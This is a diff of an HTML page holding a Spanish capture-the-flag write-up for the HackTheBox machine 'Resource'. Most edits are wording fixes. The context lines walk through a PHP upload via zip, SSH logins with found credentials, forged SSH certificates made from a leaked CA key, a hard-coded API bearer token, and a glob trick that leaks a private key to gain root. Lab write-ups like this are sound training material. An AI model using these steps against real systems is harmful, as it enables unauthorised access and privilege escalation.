@@ -3,47 +3,17 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Writeup EarlyAccess</title>
+  <title>Writeup Resource</title>
  <link rel="stylesheet" href="/assets/css/styles_machine.css" />
+ <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
+ <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">    
 </head>
 <body>
-  <div class="menu">
-    <div id="mySidepanel" class="sidepanel">
-        <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">×</a>
-        <a href="/htb">HackTheBox</a>
-        <a href="/">Home</a>
-        <a href="https://mrpr1ngl3s.github.io/blog">Blog</a>
-    </div>
-    
-    <button class="openbtn" onclick="openNav()">☰</button>  
-</div>
-<script>
-function openNav() {
-if (window.innerWidth <= 1000) {
-    document.getElementById("mySidepanel").style.display = "block";
-} else {
-    document.getElementById("mySidepanel").style.width = "25%";
-}
-}
-
-function closeNav() {
-if (window.innerWidth <= 1000) {
-    document.getElementById("mySidepanel").style.display = "none";
-} else {
-    document.getElementById("mySidepanel").style.width = "0";
-}
-
-}
-
-</script>
-
   <div class="main">
-    <a href="https://app.hackthebox.com/machines/Resource/"  target="_blank"><img style="float: right; margin-left:60px; height:90px;" src="/img/Resource.png"/></a>
-
-
+<a href="https://app.hackthebox.com/machines/Resource/"  target="_blank"><img style="float: right; margin-left:60px; height:90px;" src="/img/Resource.png"/></a>
 <h1 id="resource">Resource</h1>
 <h2 id="enumeración">Enumeración</h2>
 <p>Iniciamos con la máquina comprobando la conectividad realizando un <strong>ping</strong> a la IP <strong>10.10.11.27</strong>.</p>
@@ -171,6 +141,7 @@ if (window.innerWidth <= 1000) {
 </table>
 <p>Si nos fijamos, podemos observar que el dominio es <strong>itrc.ssg.htb</strong>. Por ello, si intentamos acceder directamente, no será posible resolverlo, ya que primero debemos indicarle al sistema que dicho dominio está asociado a la dirección IP <strong>10.10.11.27</strong>, agregándolo en el archivo <strong>/etc/hosts</strong>.</p>
 <p><img src="Img/Pasted image 20250208110446.png"></p>
+<h2 id="búsqueda-de-vulnerabilidades">Búsqueda de Vulnerabilidades</h2>
 <p>Al acceder ahora sí a la página, podemos observar que tenemos la posibilidad de registrarnos e iniciar sesión.</p>
 <p><img src="Img/Pasted image 20250208110751.png"></p>
 <p><img src="Img/Pasted image 20250208110805.png"></p>
@@ -179,9 +150,9 @@ if (window.innerWidth <= 1000) {
 <p><img src="Img/Pasted image 20250208112827.png"></p>
 <p>Al acceder, nos muestra un apartado donde podemos crear tickets.</p>
 <p><img src="Img/Pasted image 20250208112905.png"></p>
-<p>Si observamos, podemos ver que tenemos la posibilidad de subir archivos <strong>.zip</strong> .</p>
+<p>Si observamos, podemos ver que tenemos la posibilidad de subir archivos <strong>.zip</strong>.</p>
 <p><img src="Img/Pasted image 20250208114311.png"></p>
-<p>Creamos uno que contenga un archivo <strong>.php</strong> .</p>
+<p>Creamos uno que contenga un archivo <strong>.php</strong>.</p>
 <p><img src="Img/Pasted image 20250208120635.png"></p>
 <p>Lo subimos</p>
 <p><img src="Img/Pasted image 20250208121759.png"></p>
@@ -204,7 +175,7 @@ if (window.innerWidth <= 1000) {
 <p>Y podemos observar que dentro contiene un archivo</p>
 <p><img src="Img/Pasted image 20250208183648.png"></p>
 <p><img src="Img/Pasted image 20250208183629.png"></p>
-<p>Al mirar dentro del archivo, podemos ver unas credenciales.</p>
+<p>Al mirar dentro de este podemos ver unas credenciales.</p>
 <p><img src="Img/Pasted image 20250208183844.png"></p>
 <p>Si tratamos de acceder vía <strong>SSH</strong> con las credenciales encontradas si nos deja acceder, pero si nos fijamos vemos que estamos dentro de un contenedor.</p>
 <div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a>❯ <span class="fu">ssh</span> msainristil@10.10.11.27</span>
@@ -219,13 +190,13 @@ if (window.innerWidth <= 1000) {
 <span id="cb4-10"><a href="#cb4-10" aria-hidden="true"></a><span class="st">permitted by applicable law.</span></span>
 <span id="cb4-11"><a href="#cb4-11" aria-hidden="true"></a><span class="st">Last login: Sat Feb  8 17:40:57 2025 from 10.10.14.11</span></span>
 <span id="cb4-12"><a href="#cb4-12" aria-hidden="true"></a><span class="st">msainristil@itrc:~$ </span></span></code></pre></div>
-<p>Vemos que hay un usuario con nombre <strong>zzinter</strong> .</p>
+<p>Vemos que hay un usuario con nombre <strong>zzinter</strong>.</p>
 <div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true"></a><span class="ex">msainristil@itrc</span>:~$ grep sh$ /etc/passwd </span>
 <span id="cb5-2"><a href="#cb5-2" aria-hidden="true"></a><span class="ex">root</span>:x:0:0:root:/root:/bin/bash</span>
 <span id="cb5-3"><a href="#cb5-3" aria-hidden="true"></a><span class="ex">msainristil</span>:x:1000:1000::/home/msainristil:/bin/bash</span>
 <span id="cb5-4"><a href="#cb5-4" aria-hidden="true"></a><span class="ex">zzinter</span>:x:1001:1001::/home/zzinter:/bin/bash</span>
 <span id="cb5-5"><a href="#cb5-5" aria-hidden="true"></a><span class="ex">msainristil@itrc</span>:~$ </span></code></pre></div>
-<p>Si miramos en nuestro directorio de trabajo, podemos observar que tenemos un directorio el cual contiene 2 claves, una privada y una publica de una entidad certificadora <strong>CA</strong> .</p>
+<p>Si miramos en nuestro directorio de trabajo, podemos observar que tenemos un directorio el cual contiene 2 claves, una privada y una publica de una entidad certificadora <strong>CA</strong>.</p>
 <div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a><span class="ex">msainristil@itrc</span>:~$ ls -la                     </span>
 <span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a><span class="ex">total</span> 36</span>
 <span id="cb6-3"><a href="#cb6-3" aria-hidden="true"></a><span class="ex">drwx------</span> 1 msainristil msainristil 4096 Feb  8 19:20 .</span>
@@ -304,7 +275,7 @@ if (window.innerWidth <= 1000) {
 <span id="cb9-4"><a href="#cb9-4" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 msainristil msainristil 2023 Feb  8 19:39 id_rsa-cert.pub</span>
 <span id="cb9-5"><a href="#cb9-5" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 msainristil msainristil  570 Feb  8 19:20 id_rsa.pub</span>
 <span id="cb9-6"><a href="#cb9-6" aria-hidden="true"></a><span class="ex">msainristil@itrc</span>:~$ </span></code></pre></div>
-<p>Con el certificado ya creado, ya podemos acceder sin proporcionar ninguna contraseña, como el usuario <strong>zzinter</strong> .</p>
+<p>Con el certificado ya creado, ya podemos acceder sin proporcionar ninguna contraseña, como el usuario <strong>zzinter</strong>.</p>
 <div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a><span class="ex">msainristil@itrc</span>:~$ ssh -o CertificateFile=.ssh/id_rsa-cert.pub -i .ssh/id_rsa zzinter@localhost</span>
 <span id="cb10-2"><a href="#cb10-2" aria-hidden="true"></a><span class="ex">Linux</span> itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64</span>
 <span id="cb10-3"><a href="#cb10-3" aria-hidden="true"></a></span>
@@ -512,7 +483,7 @@ if (window.innerWidth <= 1000) {
 <span id="cb17-38"><a href="#cb17-38" aria-hidden="true"></a></span>
 <span id="cb17-39"><a href="#cb17-39" aria-hidden="true"></a><span class="ex">curl</span> -s signserv.ssg.htb/v1/sign -d <span class="st">&#39;{&quot;pubkey&quot;: &quot;&#39;&quot;</span><span class="va">$public_key</span><span class="st">&quot;&#39;&quot;, &quot;username&quot;: &quot;&#39;&quot;</span><span class="va">$username</span><span class="st">&quot;&#39;&quot;, &quot;principals&quot;: &quot;&#39;&quot;</span><span class="va">$principal</span><span class="st">&quot;&#39;&quot;}&#39;</span> -H <span class="st">&quot;Content-Type: application/json&quot;</span> -H <span class="st">&quot;Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE&quot;</span></span>
 <span id="cb17-40"><a href="#cb17-40" aria-hidden="true"></a><span class="ex">zzinter@itrc</span>:~$ </span></code></pre></div>
-<p>Al creamos los certificados, vemos que solo nos permite crear el de <strong>zzinter_temp</strong>.</p>
+<p>Al crearnos los certificados, vemos que solo nos permite crear el de <strong>zzinter_temp</strong>.</p>
 <div class="sourceCode" id="cb18"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true"></a><span class="ex">zzinter@itrc</span>:~$ bash /tmp/sign_key_api.sh .ssh/id_rsa.pub test root_user</span>
 <span id="cb18-2"><a href="#cb18-2" aria-hidden="true"></a>{<span class="st">&quot;detail&quot;</span>:<span class="st">&quot;Root access must be granted manually. See the IT admin staff.&quot;</span>}</span>
 <span id="cb18-3"><a href="#cb18-3" aria-hidden="true"></a><span class="ex">zzinter@itrc</span>:~$ bash /tmp/sign_key_api.sh .ssh/id_rsa.pub test zzinter_temp</span>
@@ -559,7 +530,7 @@ if (window.innerWidth <= 1000) {
 <span id="cb20-5"><a href="#cb20-5" aria-hidden="true"></a><span class="ex">User</span> zzinter may run the following commands on ssg:</span>
 <span id="cb20-6"><a href="#cb20-6" aria-hidden="true"></a>    <span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="ex">NOPASSWD</span>: /opt/sign_key.sh</span>
 <span id="cb20-7"><a href="#cb20-7" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ </span></code></pre></div>
-<p>Si miramos el código del script vemos que está creando un certificado</p>
+<p>Mirando el código del script vemos que está creando un certificado</p>
 <div class="sourceCode" id="cb21"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ cat /opt/sign_key.sh </span>
 <span id="cb21-2"><a href="#cb21-2" aria-hidden="true"></a><span class="co">#!/bin/bash</span></span>
 <span id="cb21-3"><a href="#cb21-3" aria-hidden="true"></a></span>
@@ -647,7 +618,7 @@ if (window.innerWidth <= 1000) {
 <span id="cb25-3"><a href="#cb25-3" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ cat new_key </span>
 <span id="cb25-4"><a href="#cb25-4" aria-hidden="true"></a><span class="ex">qwetawsdgsy</span></span>
 <span id="cb25-5"><a href="#cb25-5" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ </span></code></pre></div>
-<p>De primeras parecería que los 2 archivos no son iguales, y es cierto ya que al ejecutar el script, no recibo ningún mensaje.</p>
+<p>De primeras parecería que los 2 archivos no son iguales, y es cierto ya que al ejecutar el script, no recibimos ningún mensaje.</p>
 <div class="sourceCode" id="cb26"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ ./test.sh new_key</span>
 <span id="cb26-2"><a href="#cb26-2" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ </span></code></pre></div>
 <p>Pero si ahora, en el archivo <strong>new_key</strong> le añadimos un asterisco <strong>*</strong> resulta que ahora el contenido de los 2 archivos si son iguales.</p>
@@ -714,7 +685,7 @@ if (window.innerWidth <= 1000) {
 <span id="cb29-9"><a href="#cb29-9" aria-hidden="true"></a><span class="va">QBAgM=</span></span>
 <span id="cb29-10"><a href="#cb29-10" aria-hidden="true"></a><span class="ex">-----END</span> OPENSSH PRIVATE KEY-----</span>
 <span id="cb29-11"><a href="#cb29-11" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ </span></code></pre></div>
-<p>Con la clave privada ya obtenida, podemos crear el certificado que utilizaremos para poder luego acceder como el usuario <strong>root</strong> .</p>
+<p>Con la clave privada ya obtenida, podemos crear el certificado que utilizaremos para poder luego acceder como el usuario <strong>root</strong>.</p>
 <p>Creamos la clave SSH.</p>
 <div class="sourceCode" id="cb30"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ ssh-keygen</span>
 <span id="cb30-2"><a href="#cb30-2" aria-hidden="true"></a><span class="ex">Generating</span> public/private rsa key pair.</span>
@@ -749,7 +720,7 @@ if (window.innerWidth <= 1000) {
 <span id="cb31-7"><a href="#cb31-7" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 zzinter zzinter 1118 Feb  9 12:44 id_rsa-cert.pub</span>
 <span id="cb31-8"><a href="#cb31-8" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 zzinter zzinter  565 Feb  9 12:41 id_rsa.pub</span>
 <span id="cb31-9"><a href="#cb31-9" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ </span></code></pre></div>
-<p>Ya finalmente podemos acceder como el usuario <strong>root</strong> .</p>
+<p>Finalmente podemos acceder como el usuario <strong>root</strong>.</p>
 <div class="sourceCode" id="cb32"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ ssh -o CertificateFile=.ssh/id_rsa-cert.pub -i .ssh/id_rsa root@localhost -p 2222</span>
 <span id="cb32-2"><a href="#cb32-2" aria-hidden="true"></a><span class="ex">The</span> authenticity of host <span class="st">&#39;[localhost]:2222 ([127.0.0.1]:2222)&#39;</span> can<span class="st">&#39;t be established.</span></span>
 <span id="cb32-3"><a href="#cb32-3" aria-hidden="true"></a><span class="st">ED25519 key fingerprint is SHA256:tOsmHdA7xDQq2UDyCf0EobZ/LcitevFrAQ6RSJCy10Q.</span></span>
@@ -786,7 +757,7 @@ if (window.innerWidth <= 1000) {
 <span id="cb32-34"><a href="#cb32-34" aria-hidden="true"></a></span>
 <span id="cb32-35"><a href="#cb32-35" aria-hidden="true"></a></span>
 <span id="cb32-36"><a href="#cb32-36" aria-hidden="true"></a><span class="st">root@ssg:~# </span></span></code></pre></div>
-<p>Y ya podemos ver la ultima flag.</p>
+<p>Y ya podemos visualizar la ultima flag.</p>
 <div class="sourceCode" id="cb33"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true"></a><span class="ex">root@ssg</span>:~# cat root.txt </span>
 <span id="cb33-2"><a href="#cb33-2" aria-hidden="true"></a><span class="ex">229*****************************</span></span>
 <span id="cb33-3"><a href="#cb33-3" aria-hidden="true"></a><span class="ex">root@ssg</span>:~# </span></code></pre></div>
@@ -799,6 +770,7 @@ if (window.innerWidth <= 1000) {
 
 
   </div>
+  <script src="/assets/js/Nav.js" defer></script>
 </body>
 </html>
 
